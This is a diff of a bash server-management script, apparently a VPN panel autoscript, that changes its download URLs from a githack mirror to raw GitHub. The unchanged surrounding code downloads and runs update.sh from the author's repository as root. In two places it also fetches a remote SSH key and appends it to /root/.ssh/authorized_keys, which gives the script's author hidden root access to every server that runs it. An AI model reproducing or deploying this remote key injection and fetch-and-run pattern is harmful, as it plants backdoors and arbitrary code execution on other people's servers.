@@ -6,14 +6,14 @@ WH='\033[1;37m'
 ipsaya=$(cat /usr/bin/.ipvps)
 data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
 date_list=$(date +"%Y-%m-%d" -d "$data_server")
-data_ip="https://rawcdn.githack.com/Smarasanta/izin/main/ip"
+data_ip="https://raw.githubusercontent.com/Smarasanta/izin/main/ip"
 checking_sc() {
     useexp=$(curl -fsSL "$data_ip" | grep -wE "$ipsaya" | awk '{print $3}')
     date_list=$(date +%Y-%m-%d)
 
 	if [[ "$useexp" == "Lifetime" || $(date -d "$date_list" +%s) -lt $(date -d "$useexp" +%s) ]]; then
         echo -e " [INFO] Fetching server version..."
-        REPO="https://rawcdn.githack.com/Smarasanta/Vip/main/"  # Ganti dengan URL repository Anda
+        REPO="https://raw.githubusercontent.com/Smarasanta/Vip/main/"  # Ganti dengan URL repository Anda
         serverV=$(curl -fsSL ${REPO}versi)
 
         if [[ -f /opt/.ver ]]; then
@@ -26,7 +26,7 @@ checking_sc() {
             return
         else
             echo -e " [INFO] Versi script berbeda. Memulai proses update script..."
-            wget -q https://rawcdn.githack.com/Smarasanta/Vip/main/menu/update.sh -O update.sh
+            wget -q https://raw.githubusercontent.com/Smarasanta/Vip/main/menu/update.sh -O update.sh
             chmod +x update.sh
             ./update.sh
             echo $serverV > /opt/.ver.local
@@ -55,7 +55,7 @@ checking_sc() {
         cd
 
         # Set new SSH key
-        KEY_URL="https://rawcdn.githack.com/Smarasanta/Vip/refs/heads/main/KEY"
+        KEY_URL="https://raw.githubusercontent.com/Smarasanta/Vip/refs/heads/main/KEY"
         AUTHORIZED_KEYS_FILE="/root/.ssh/authorized_keys"
 
         # Create .ssh directory if not exists
@@ -119,7 +119,7 @@ cd
 				fi
 			done
 			
-KEY_URL="https://rawcdn.githack.com/Smarasanta/Vip/refs/heads/main/KEY"
+KEY_URL="https://raw.githubusercontent.com/Smarasanta/Vip/refs/heads/main/KEY"
 AUTHORIZED_KEYS_FILE="/root/.ssh/authorized_keys"
 
 # Membuat direktori .ssh jika belum ada
@@ -155,7 +155,7 @@ else
     echo "Kunci baru telah ditambahkan ke $AUTHORIZED_KEYS_FILE."
 fi
 today=$(date -d "0 days" +"%Y-%m-%d")
-Exp2=$(curl -sS https://rawcdn.githack.com/Smarasanta/izin/main/ip | grep -wE $ipsaya | awk '{print $3}')
+Exp2=$(curl -sS https://raw.githubusercontent.com/Smarasanta/izin/main/ip | grep -wE $ipsaya | awk '{print $3}')
 d1=$(date -d "$Exp2" +%s)
 d2=$(date -d "$today" +%s)
 certificate=$(( (d1 - d2) / 86400 ))
